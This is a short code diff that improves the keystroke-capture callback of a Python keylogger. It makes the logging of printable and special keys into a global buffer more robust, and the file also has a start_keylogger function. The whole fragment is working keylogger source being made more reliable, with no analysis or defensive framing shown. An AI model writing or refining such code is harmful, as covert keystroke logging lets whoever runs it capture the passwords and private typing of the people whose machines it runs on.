@@ -93,14 +93,20 @@ def on_press(key):
     if not keylogger_active:
         return
     try:
-        logged_keys += str(key.char)
-    except AttributeError:
-        if key == key.space:
-            logged_keys += " "
-        elif key == key.enter:
-            logged_keys += "\n"
+        # Only add the character if it's not None (i.e., it's a real printable key)
+        if hasattr(key, 'char') and key.char is not None:
+            logged_keys += key.char
         else:
-            logged_keys += f" [{str(key)}] "
+            # Handle special keys properly
+            if key == keyboard.Key.space:
+                logged_keys += " "
+            elif key == keyboard.Key.enter:
+                logged_keys += "\n"
+            else:
+                logged_keys += f" [{key}] "
+    except Exception:
+        # Fallback for any unexpected key type
+        logged_keys += f" [{key}] "
 
 def start_keylogger():
     global keylogger_active
